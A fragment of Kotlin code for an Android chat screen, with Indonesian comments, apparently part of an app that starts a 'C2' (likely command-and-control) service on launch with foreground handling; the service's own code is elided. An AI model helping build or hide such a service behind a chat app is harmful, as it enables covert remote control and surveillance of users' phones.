...
class ChatActivity : AppCompatActivity() {
    ...
    override fun onCreate(savedInstanceState: Bundle?) {
        ...
        // 🔥 FIX: Start C2 Service dengan foreground handling
        startC2Service()
    ...
    // 🔥 FIX: Fungsi baru untuk start service dengan aman
    private fun startC2Service() {
        try {
            ...
            android.util.Log.e("ChatActivity", "Gagal start C2 service", e)
        }
    }
